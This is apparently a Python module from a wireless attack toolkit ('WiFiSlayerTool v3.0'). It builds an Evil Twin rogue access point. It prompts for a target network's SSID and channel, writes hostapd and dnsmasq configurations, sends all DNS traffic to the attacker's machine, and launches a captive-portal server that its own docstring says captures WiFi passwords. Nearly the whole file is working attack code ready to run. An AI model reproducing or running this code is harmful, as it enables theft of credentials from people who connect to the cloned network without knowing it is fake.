# -*- coding: utf-8 -*-
"""
WiFiSlayerTool v3.0 — Evil Twin Attack Module
Create a rogue AP and captive portal to capture WiFi passwords.
"""

import os
import subprocess
import time

from core.logger import log
from core.ui import (
    console, print_section, print_success, print_error,
    print_warning, print_info, select_interface, confirm_action,
)
from core.validator import safe_input, validate_mac, validate_channel
from core.network import get_wireless_interfaces, enable_monitor_mode, disable_monitor_mode
from core.ascii_art import print_eviltwin_art
from config import get_text, BASE_DIR

WEB_DIR = os.path.join(BASE_DIR, "web")


def eviltwin_menu(current_interface=None):
    """Evil Twin Attack."""
    os.system("clear" if os.name != "nt" else "cls")
    print_eviltwin_art()
    
    print_section(get_text("menu_advanced"))
    
    print_warning(get_text("eviltwin_req"))
    print_warning(get_text("eviltwin_req1"))
    print_warning(get_text("eviltwin_req2"))
        
    console.print()

    interfaces = get_wireless_interfaces()
    if not interfaces:
        print_error(get_text("no_interface"))
        return

    # 1. Select interface for AP
    print_info("Select interface to host the Fake AP (e.g., wlan0):")
    ap_iface = select_interface(interfaces)
    if not ap_iface:
        return

    # 2. Get Target Info
    target_ssid = safe_input("Enter Target SSID (Network Name) / اسم الشبكة الهدف", console=console)
    if not target_ssid:
        return

    target_channel = safe_input("Enter Target Channel / رقم القناة (1-14)", validate_channel, console)
    if not target_channel:
        return

    if not confirm_action(get_text("confirm_attack")):
        return

    # Setup Hostapd config
    hostapd_conf = "/tmp/hostapd-eviltwin.conf"
    with open(hostapd_conf, "w") as f:
        f.write(f"interface={ap_iface}\n")
        f.write(f"ssid={target_ssid}\n")
        f.write(f"channel={target_channel}\n")
        f.write("driver=nl80211\n")
        f.write("hw_mode=g\n")

    # Setup dnsmasq config
    dnsmasq_conf = "/tmp/dnsmasq-eviltwin.conf"
    with open(dnsmasq_conf, "w") as f:
        f.write(f"interface={ap_iface}\n")
        f.write("dhcp-range=192.168.1.10,192.168.1.100,8h\n")
        f.write("dhcp-option=3,192.168.1.1\n")
        f.write("dhcp-option=6,192.168.1.1\n")
        f.write("server=8.8.8.8\n")
        f.write("log-queries\n")
        f.write("log-dhcp\n")
        f.write("listen-address=127.0.0.1\n")
        f.write("address=/#/192.168.1.1\n") # Redirect ALL DNS queries to us

    log.info(f"Evil Twin Attack started: SSID={target_ssid}, AP_Iface={ap_iface}")
    print_info(f"Starting Evil Twin [bold]{target_ssid}[/] on {ap_iface} ...")

    try:
        # Cleanup old processes
        os.system("sudo killall hostapd dnsmasq 2>/dev/null")
        os.system(f"sudo ip link set {ap_iface} up")
        os.system(f"sudo ip addr add 192.168.1.1/24 dev {ap_iface}")

        # Start hostapd and dnsmasq
        hostapd_proc = subprocess.Popen(["sudo", "hostapd", hostapd_conf], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        dnsmasq_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", dnsmasq_conf, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print_success(get_text("eviltwin_started"))
        
        # We need a simple Python web server to capture passwords
        print_info(get_text("eviltwin_portal"))
        print_warning(get_text("press_ctrl_c"))
        
        # Start our custom web server
        server_script = os.path.join(BASE_DIR, "modules", "eviltwin_server.py")
        subprocess.run(["sudo", "python3", server_script])

    except KeyboardInterrupt:
        console.print()
        print_info(get_text("eviltwin_stopping"))
    finally:
        # Cleanup
        os.system("sudo killall hostapd dnsmasq 2>/dev/null")
        os.system(f"sudo ip addr flush dev {ap_iface}")
        os.system(f"sudo ip link set {ap_iface} down")
        os.system(f"sudo ip link set {ap_iface} up")
        log.info("Evil Twin Attack stopped")
        print_info(get_text("eviltwin_cleaned"))
